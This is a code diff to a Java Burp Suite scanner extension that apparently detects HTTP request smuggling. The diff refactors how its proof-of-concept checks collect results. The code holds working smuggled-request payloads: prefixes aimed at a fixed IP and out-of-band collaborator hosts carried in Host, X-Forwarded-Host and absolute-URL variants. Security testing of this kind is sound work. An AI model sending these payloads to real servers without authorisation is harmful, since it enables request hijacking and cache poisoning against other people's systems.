@@ -3,6 +3,8 @@ package burp;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.util.HashMap;
+import java.util.HashSet;
+import java.util.LinkedHashSet;
 import java.util.List;
 import java.util.zip.GZIPOutputStream;
 
@@ -13,43 +15,74 @@ public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {
     }
 
     boolean sendPoc(byte[] base, IHttpService service, HashMap<String, Boolean> config) {
-        boolean gpoc = false;
-        boolean cpoc2 = false;
-        boolean cpoc3 = false;
 
+        HashSet<Boolean> results = new LinkedHashSet<>();
         if (Utilities.globalSettings.getBoolean("poc: G")) {
-            gpoc = prepPoc(base, service, "G", "G", config);
+            results.add(prepPoc(base, service, "G", "G", config));
         }
         //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
         //boolean cpoc = sendPoc(base, service, "collab", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
+
         String collabWithHost = service.getHost() + ".xgh671sw1qfujgcs17uxlyxn4ea4yt.psres.net";
 
         if (Utilities.globalSettings.getBoolean("poc: headerConcat")) {
-            cpoc2 = prepPoc(base, service, "headerConcat", "GET /?x=ma0y2848iz35nt9im7yeziwqxh37rw/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nFoo: x", config);
+            results.add(prepPoc(base, service, "headerConcat",
+                      "GET /?x=ma0y2848iz35nt9im7yeziwqxh37rw/"+service.getHost()+" HTTP/1.1\r\n" +
+                            "Host: 52.16.21.24\r\n" +
+                            "Foo: x", config));
         }
         if (Utilities.globalSettings.getBoolean("poc: bodyConcat")) {
-            cpoc3 = prepPoc(base, service, "bodyConcat", "POST /?x=ma0y2848iz35nt9im7yeziwqxh37rw/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 8\r\n\r\nfoo=", config);
+            results.add(prepPoc(base, service, "bodyConcat",
+                      "POST /?x=ma0y2848iz35nt9im7yeziwqxh37rw/"+service.getHost()+" HTTP/1.1\r\n" +
+                            "Host: 52.16.21.24\r\n" +
+                            "Content-Type: application/x-www-form-urlencoded\r\n" +
+                            "Content-Length: 8\r\n\r\n" +
+                            "foo=", config));
         }
         if (Utilities.globalSettings.getBoolean("poc: collab")) {
-            prepPoc(base, service, "collab", "GET / HTTP/1.1\r\nHost: "+collabWithHost+"\r\n\r\n", config);
+            results.add(prepPoc(base, service, "collab",
+                      "GET / HTTP/1.1\r\n" +
+                            "Host: "+collabWithHost+"\r\n\r\n", config));
         }
         if (Utilities.globalSettings.getBoolean("poc: collab-header")) {
-            prepPoc(base, service, "collab-header", "GET / HTTP/1.1\r\nHost: "+collabWithHost+"\r\nX-Foo: X", config);
+            results.add(prepPoc(base, service, "collab-header",
+                      "GET / HTTP/1.1\r\n" +
+                            "Host: "+collabWithHost+"\r\n" +
+                            "X-Foo: X", config));
         }
         if (Utilities.globalSettings.getBoolean("poc: collab-XFO-header")) {
-            prepPoc(base, service, "collab-header", "GET / HTTP/1.1\r\nX-Forwarded-Host: "+collabWithHost+"\r\nX-Foo: X", config);
+            results.add(prepPoc(base, service, "collab-header",
+                    "GET / HTTP/1.1\r\n" +
+                    "X-Forwarded-Host: "+collabWithHost+"\r\n" +
+                    "X-Foo: X", config));
         }
         if (Utilities.globalSettings.getBoolean("poc: collab-abs")) {
-            prepPoc(base, service, "collab-header", "GET http://"+collabWithHost+"/ HTTP/1.1\r\nX-Foo: X", config);
+            results.add(prepPoc(base, service, "collab-header",
+                      "GET http://"+collabWithHost+"/ HTTP/1.1\r\n" +
+                            "X-Foo: X", config));
         }
         if (Utilities.globalSettings.getBoolean("poc: collab-at")) {
-            prepPoc(base, service, "collab-header", "GET @"+collabWithHost+"/ HTTP/1.1\r\nX-Foo: X", config);
+            results.add(prepPoc(base, service,
+                      "collab-header",
+                      "GET @"+collabWithHost+"/ HTTP/1.1\r\n" +
+                            "X-Foo: X", config));
         }
         if (Utilities.globalSettings.getBoolean("poc: collab-blind")) {
-            String req = String.format("GET / HTTP/1.1\r\nHost: %s\r\nReferer: ref.%s\r\nX-Forwarded-For: xff.%s\r\nTrue-Client-IP: tci.%s\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\r\nConnection: close\r\n\r\n", service.getHost(), collabWithHost, collabWithHost, collabWithHost);
-            prepPoc(base, service, "collab-header", req, config);
+            String req = String.format(
+                    "GET / HTTP/1.1\r\n" +
+                    "Host: %s\r\n" +
+                    "Referer: ref.%s\r\n" +
+                    "X-Forwarded-For: xff.%s\r\n" +
+                    "True-Client-IP: tci.%s\r\n" +
+                    "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0\r\n" +
+                    "Accept-Encoding: gzip, deflate\r\n" +
+                    "Accept: */*\r\n" +
+                    "Accept-Language: en\r\n" +
+                    "connection: close\r\n\r\n", service.getHost(), collabWithHost, collabWithHost, collabWithHost);
+            // 'Connection: close' gets changed to keep-alive which breaks the offset
+            results.add(prepPoc(base, service, "collab-header", req, config));
         }
-        return gpoc || cpoc2 || cpoc3;
+        return results.contains(Boolean.TRUE);
     }
 
     class DualChunkCL {
